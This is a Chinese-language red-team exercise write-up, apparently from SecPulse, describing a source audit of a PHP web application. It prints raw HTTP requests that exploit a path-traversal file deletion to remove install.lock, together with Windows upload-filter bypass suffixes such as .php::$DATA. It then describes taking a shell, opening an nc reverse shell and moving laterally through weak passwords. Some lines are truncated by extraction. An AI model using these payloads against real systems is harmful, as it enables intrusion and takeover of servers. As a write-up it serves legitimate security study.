报告，我已打⼊地⽅内部
-
安全脉搏
SecPulse.COM |
“ if (is_array($post['ids'])) { foreach
($post['ids'] as $file) {
$fileservice->del_dir(ROOT_......
下载后打开，发现是程序的源码，sql ⽂件都在⾥⾯。
找程序中找到的数据库的 ip、账号、密码等信息，试试
能不能连接。
审计源码，发现漏洞
既然连接不上，那么只能审计⼀下源码了，先拿⼯具扫⼀
下。
经过查看，发
现
/application/index/controller/system/SystemUpgradecl
中的 ⽅法可以任意提交参数。
ient.php setcopydel
可以看到以 post ⽅式接收了俩个参数，⼀个是 ，⼀
id
个是
ids
if (is_array($post['ids'])) {
foreach ($post['ids'] as $file) {
$fileservice->del_dir(ROOT_PATH . 'public' . D
}
}
if ($post['id']) {
$copyFile = ROOT_PATH . 'public' . DS . 'copyfile'
// echo $copyFile;exit;
$fileservice->del_file($copyFile);
}
ids是需要数组的，然后拼接路径，传⼊
$fileservice->del_dir()⽅法中。
id没有类型判断，直接拼接路径传⼊$fileservice-
>del_file()⽅法中。
那来看看这俩个⽅法中做了什么事情。
$fileservice->del_dir()⽅法是删除⽬录
删除⽬录，看来这是⼀个任意⽂件删除漏洞, 分析下源
码。
static function del_dir($dirName)
{
if (!file_exists($dirName)) # 判断⽂件或⽬录是否存在，
{
return false;
}
$dir = opendir($dirName); # 打开⼀个⽬录，读取它的内
while ($fileName = readdir($dir))
{
$file = $dirName . '/' . $fileName;
if ($fileName != '.' && $fileName != '..')
{
if (is_dir($file)) # 判断是不是⽬录,是⽬录就在
{
self::del_dir($file);
}
else
{
unlink($file); # 删除⽂件
}
}
}
closedir($dir);
return rmdir($dirName); # 删除⽬录
}
$fileservice->del_file()⽅法是删除⽂件
这就没有什么好说的了，判断⽂件是否存在，然后删除。
但是，这是 hw 啊，这漏洞什么⽤都没有啊，只能继续找
其他漏洞了。
经过漫⻓的查找终于在
applicationadmincontrollersettingSystemCo
nfig.php中的发现了view_upload上传的⽅法。
这个⽅法中，type为 3 的时候是上传⽂件的，然后传⼊
Upload::file⽅法。
但是在这个⽅法中判断了后缀名不能为php, 但是在 win
的系统中，可以通过以下的⼀些⽅法绕过。
.php.
.php(空格)
.php:1.jpg
.php::$DATA
.php::$DATA…….
等等、、、
经过尝试，发现使⽤1.php::$DATA这样的⽅式可以绕
过，构造的 post 数据包为：
POST /index.php/admin/setting.system_config/view_uploa
Host: xxx.com
Content-Length: 403
Cache-Control: max-age=0
Origin: http://xxx.com
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKit
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) A
Accept: text/html,application/xhtml+xml,application/xm
Referer: http://xxx.com/index.php/admin/setting.system
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=es9ef1h1c9i0t21brcrlqigfmt
Connection: close
------WebKitFormBoundaryP7jKNcoemK2sybZb
Content-Disposition: form-data; name="file"
site_logo
------WebKitFormBoundaryP7jKNcoemK2sybZb
Content-Disposition: form-data; name="type"
3
------WebKitFormBoundaryP7jKNcoemK2sybZb
Content-Disposition: form-data; name="site_logo"; file
Content-Type: image/png
------WebKitFormBoundaryP7jKNcoemK2sybZb--
成功上传⽂件，但是这个⽂件上传需要后台登录才能上
传，后台之前就已经爆破过了，没有爆破出来账号密码。
但是这个程序有install⽂件, 根据经验知道程序安装⽂
件都会在安装后创建⼀个⽂件，来判断是否已经安装，所
以在看看是否和我想的⼀样。
可以看到确实是⽣成了⼀个install.lock⽂件来判断
是否安装成功，那么我们可以通过之前的任意⽂件删除漏
洞来删除这个⽂件让系统进⾏重装。
但是这个删除⽂件，对系统进⾏重装，这就得问问裁判组
能不能让了啊，经常协商，他们觉得这个程序不重要，在
能保证不破坏程序的时候可以做。
既然他们说可以了，那么我就⼩⼼翼翼的构造⼀下 post
包，别真的给程序破坏了。
利⽤漏洞拿到 shell
删除install.lock⽂件的数据包：
POST /index.php/admin/system.System_Upgradeclient/setc
Host: www.xxx.wang
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.xxx.wang
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) A
Accept: text/html,application/xhtml+xml,application/xm
Referer: http://www.xxx.wang/index.php/admin/system.Sy
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8itmp7itfo1va6uu7bu0ouhgos
Connection: close
id=/../install/install.lock&ids=1
返回值是成功的，看来没有问题，那就到重装系统的时候
了，为了不对系统的数据造成破坏，我们对系统安装需要
连接的 mysql 放到⾃⼰的服务器中。
成功登录后台，然后上传 shell，还是之前的那个数据
包，没有什么好说的，拿到 shell 后我⽤ nc 反弹⼀下，
查看了系统上都有什么程序，发现这个系统上存在五个程
序。
既然上来了，那就收集⼀下信息，然后把流量代理出去扫
描⼀下，结果发现：
只是扫描了⼀下下⽽已，这个多弱⼝令，这稳了，通过这
些弱⼝令在来做横向移动，⼀共拿下了近百台的机器，得
了 3600 分。
报告，我已打⼊敌⽅内部！
本⽂作者： 酒仙桥六号部队
本⽂为安全脉搏专栏作者发布，转载请注明：
https://www.secpulse.com/archives/156534.html
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明
|---|--|--|--|
| 0 |  |  |  |
| 1 |  |  |  |
| 2 |  |  |  |
| 3 |  |  |  |
| 4 |  |  |  |
| 5 |  |  |  |
| 6 |  |  |  |